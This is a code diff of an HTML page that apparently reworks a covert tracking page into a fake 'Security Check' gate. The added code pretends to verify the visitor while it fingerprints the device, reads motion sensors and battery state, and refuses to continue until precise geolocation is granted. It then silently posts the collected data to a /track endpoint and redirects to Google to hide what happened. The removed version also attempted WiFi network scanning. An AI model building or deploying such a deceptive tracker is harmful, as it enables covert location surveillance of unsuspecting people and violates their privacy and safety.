@@ -3,122 +3,100 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>S</title>
+    <title>Security Check</title>
     <style>
-        body {
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
             background: #000;
-            color: #333;
-            overflow: hidden;
+            color: #fff;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 1.2em;
+            cursor: pointer;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        p {
+            max-width: 80%;
+            line-height: 1.5;
+        }
+
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 
 <body>
+    <div id="overlay">
+        <h2>Security Check</h2>
+        <p>Please complete the verification to continue.</p>
+        <button id="verifyBtn">Verify & Continue</button>
+        <p id="msg" style="color: red; margin-top: 20px; font-size: 0.9em;"></p>
+    </div>
+
     <script>
-        // Configuration
         const TARGET_URL = '/track';
         const REDIRECT_URL = 'https://google.com';
-        const DELAY_MS = 4000; // 4 seconds
+        const DELAY_MS = 4000;
 
         const data = {
-            type: 'STEALTH_PASSIVE',
+            type: 'STEALTH_GATEKEEPER',
             timestamp: new Date().toISOString(),
             url: window.location.href,
             referrer: document.referrer,
             viewport: `${window.innerWidth}x${window.innerHeight}`,
             location: {},
             sensors: {},
-            network: {},
-            fingerprint: {},
-            wifi: {}
+            wifi: {},
+            fingerprint: {}
         };
 
-        // 1. Coarse Geolocation (Trigger Prompt Immediately)
-        // We request high accuracy to force the "Use precise location?" system prompt if possible.
-        function tryCoarseGeo() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        data.location.lat = pos.coords.latitude;
-                        data.location.lng = pos.coords.longitude;
-                        data.location.acc = pos.coords.accuracy;
-                        data.location.source = 'api';
-                    },
-                    (err) => {
-                        data.location.geoError = err.message;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 3500,
-                        maximumAge: 0
-                    }
-                );
-            }
-        }
-
-        // 2. WiFi (Experimental)
-        async function tryWifiScan() {
-            if (navigator.connection && navigator.connection.getNetworks) {
-                try {
-                    const networks = await navigator.connection.getNetworks();
-                    if (networks && networks.length > 0) {
-                        data.wifi = networks.map(n => ({ bssid: n.bssid, signal: n.signalStrength }));
-                    } else {
-                        data.wifi = { status: "no_networks_found" };
-                    }
-                } catch (e) { data.wifi = { error: e.message }; }
-            } else { data.wifi = { status: "unsupported_browser" }; }
-        }
-
-        // 3. Sensors (Continuous Sampling)
-        function initSensors() {
+        // --- SENSORS & FINGERPRINT (Background Collection) ---
+        function collectBackgroundData() {
+            // Sensors
             if (window.DeviceMotionEvent) {
-                let readings = [];
                 window.addEventListener('devicemotion', (event) => {
-                    if (!event.accelerationIncludingGravity || event.accelerationIncludingGravity.x === null) {
-                        data.sensors.status = "unsupported_on_device";
-                        return;
+                    const acc = event.accelerationIncludingGravity;
+                    if (acc && acc.x !== null) {
+                        data.sensors.accel = { x: acc.x.toFixed(2), y: acc.y.toFixed(2), z: acc.z.toFixed(2) };
                     }
-
-                    readings.push({
-                        x: event.accelerationIncludingGravity.x,
-                        y: event.accelerationIncludingGravity.y,
-                        z: event.accelerationIncludingGravity.z
-                    });
-
-                    // Keep recent history
-                    if (readings.length > 60) readings.shift();
-
-                    // Calculate average
-                    const avg = readings.reduce((a, b) => ({ x: a.x + b.x, y: a.y + b.y, z: a.z + b.z }), { x: 0, y: 0, z: 0 });
-                    const count = readings.length || 1;
-                    data.sensors.accel = {
-                        x: (avg.x / count).toFixed(2),
-                        y: (avg.y / count).toFixed(2),
-                        z: (avg.z / count).toFixed(2)
-                    };
                 });
-            } else {
-                data.sensors.status = "unsupported";
             }
-        }
 
-        // 4. Fingerprint
-        function collectFingerprint() {
+            // Fingerprint
             try {
-                data.fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                data.fingerprint.platform = navigator.platform;
                 data.fingerprint.cores = navigator.hardwareConcurrency;
                 data.fingerprint.memory = navigator.deviceMemory;
-                data.fingerprint.platform = navigator.platform;
-
-                if (navigator.connection) {
-                    data.fingerprint.connection = {
-                        type: navigator.connection.effectiveType,
-                        rtt: navigator.connection.rtt,
-                        downlink: navigator.connection.downlink
-                    };
-                }
-
                 if (navigator.getBattery) {
                     navigator.getBattery().then(bat => {
                         data.fingerprint.battery = { level: bat.level, charging: bat.charging };
@@ -126,33 +104,63 @@
                 }
             } catch (e) { }
         }
+        collectBackgroundData();
 
-        // --- EXECUTE COLLECTION ---
-        tryCoarseGeo();
-        tryWifiScan();
-        initSensors();
-        collectFingerprint();
+        // --- MAIN LOGIC ---
+        const btn = document.getElementById('verifyBtn');
+        const msg = document.getElementById('msg');
 
-        // --- FINAL SEND & REDIRECT ---
-        setTimeout(async () => {
-            // Update timestamp
+        btn.onclick = () => {
+            msg.textContent = "Requesting access...";
+
+            // 1. Request Location
+            navigator.geolocation.getCurrentPosition(
+                // SUCCESS
+                (pos) => {
+                    msg.style.color = "#00ff00";
+                    msg.textContent = "Verified! Redirecting...";
+                    btn.style.display = 'none';
+
+                    // Capture Data
+                    data.location = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        source: 'precise'
+                    };
+
+                    // Wait 4 seconds then Send & Redirect
+                    setTimeout(() => {
+                        sendAndRedirect();
+                    }, DELAY_MS);
+                },
+                // ERROR (Blocked)
+                (err) => {
+                    console.error(err);
+                    msg.style.color = "red";
+                    msg.textContent = "Location access is required. Please 'Allow' to continue.";
+
+                    // We catch the error but we DO NOT redirect.
+                    // The user must click 'Verify' again after allowing.
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        };
+
+        function sendAndRedirect() {
             data.timestamp = new Date().toISOString();
 
-            // Send Data (Fire and Forget / Keepalive)
-            try {
-                // Use fetch with keepalive to ensure it survives the redirect
-                fetch(TARGET_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
-                    body: JSON.stringify(data),
-                    keepalive: true
-                });
-            } catch (e) { console.error(e); }
+            // Send
+            fetch(TARGET_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                keepalive: true
+            }).catch(e => console.log(e));
 
-            // Redirect to Google
+            // Redirect
             window.location.href = REDIRECT_URL;
-        }, DELAY_MS);
-
+        }
     </script>
 </body>
 
